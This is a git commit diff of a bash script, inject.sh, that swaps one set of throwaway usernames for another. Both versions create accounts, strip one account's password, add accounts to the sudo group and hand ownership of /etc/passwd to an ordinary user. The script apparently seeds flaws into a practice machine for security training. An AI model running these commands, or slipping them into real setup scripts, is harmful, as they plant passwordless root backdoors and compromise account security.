c64c981c8f872fd97b37d06aa375a98e2a04aa74
lovebarnowls <114584264+lovebarnowls@users.noreply.github.com>
2022-11-28 12:31:03 +1000

    Update inject.sh

--- inject.sh
+++ inject.sh
@@ -1,27 +1,25 @@
 #!/bin/bash
 
-sudo useradd lloris
-sudo useradd kane
-sudo useradd son
-sudo useradd royal
-sudo useradd richarlison
-sudo useradd hojbjerg
-sudo useradd dier
-sudo useradd bissouma
-sudo useradd davies
-sudo useradd lenglet
-sudo useradd royal
-sudo useradd messi 
-sudo useradd ronaldo 
-sudo useradd haaland 
-sudo useradd salah 
-sudo useradd kante 
-sudo useradd milner 
-sudo useradd becker 
-sudo useradd fernandes
-sudo useradd mourinho
-sudo useradd pochettino
-sudo passwd -d royal
-sudo usermod -aG sudo royal
-sudo chown abdulrahman /etc/passwd
+sudo useradd bsod
+sudo useradd excel
+sudo useradd powerpoint
+sudo useradd linux
+sudo useradd outlook
+sudo useradd onenote
+sudo useradd acrobat
+sudo useradd photoshop
+sudo useradd nortonantivirus
+sudo useradd vlcplayer
+sudo useradd googlechrome
+sudo useradd steam
+sudo useradd firefox
+sudo useradd audacity
+sudo useradd siri
+sudo useradd alexa
+sudo useradd garageband
+sudo useradd keynote
+sudo passwd -d bsod
+sudo usermod -aG sudo bsod
+sudo usermod -aG sudo linux
+sudo chown linux /etc/passwd
 
